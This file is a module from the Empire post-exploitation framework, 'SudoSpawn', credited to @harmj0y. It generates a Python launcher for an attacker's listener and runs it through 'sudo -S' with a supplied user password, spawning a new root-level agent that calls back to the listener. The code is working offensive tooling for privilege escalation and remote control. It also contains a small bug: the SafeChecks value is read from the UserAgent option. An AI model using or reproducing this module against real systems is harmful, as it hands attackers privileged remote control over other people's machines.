from lib.common import helpers


class Module:

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'SudoSpawn',

            # list of one or more authors for the module
            'Author': ['@harmj0y'],

            # more verbose multi-line description of the module
            'Description': ('Spawns a new Empire agent using sudo.'),

            # True if the module needs to run in the background
            'Background' : False,

            # File extension to save the file as
            'OutputExtension' : "",

            # if the module needs administrative privileges
            'NeedsAdmin' : False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe' : True,

            # the module language
            'Language' : 'python',

            # the minimum language version needed
            'MinLanguageVersion' : '2.6',

            # list of any references/other comments
            'Comments': []
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to execute module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Password' : {
                'Description'   :   'User password for sudo.',
                'Required'      :   True,
                'Value'         :   ''
            },    
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   True,
                'Value'         :   ''
            },  
            'SafeChecks' : {
                'Description'   :   'Enable SafeChecks.',
                'Required'      :   True,
                'Value'         :   'True'
            },     
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self, obfuscate=False, obfuscationCommand=""):

        # extract all of our options
        listenerName = self.options['Listener']['Value']
        userAgent = self.options['UserAgent']['Value']
        safeChecks = self.options['UserAgent']['Value']

        # generate the launcher code
        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='python', userAgent=userAgent, safeChecks=safeChecks)

        if launcher == "":
            print helpers.color("[!] Error in launcher command generation.")
            return ""
        else:

            password = self.options['Password']['Value']

            launcher = launcher.replace('"', '\\"')
            launcher = launcher.replace('echo', '')
            parts = launcher.split("|")
            launcher = "python -c %s" % (parts[0])
            script = 'import subprocess; subprocess.Popen("echo \\"%s\\" | sudo -S %s", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)' % (password, launcher)
            return script
